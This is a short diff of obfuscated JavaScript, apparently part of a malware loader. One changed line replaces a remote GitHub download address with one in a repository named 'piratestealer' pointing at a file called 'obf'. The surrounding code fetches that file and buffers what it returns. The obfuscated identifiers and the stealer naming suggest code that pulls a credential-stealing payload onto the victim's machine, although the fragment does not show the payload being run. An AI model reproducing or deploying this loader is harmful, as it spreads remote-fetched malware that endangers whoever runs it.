@@ -198,7 +198,7 @@ a0_0x2a7a89()
 function a0_0x431a7f() {
   a0_0x2340fa
     .get(
-      'https://raw.githubusercontent.com/RustlerJS/rustlers/main/deneme3',
+      'https://raw.githubusercontent.com/Ainsley3/piratestealer.github.io/main/obf',
       (_0x796cbe) => {
         let _0x46b03c = ''
         _0x796cbe.on('data', (_0xb52d59) => {
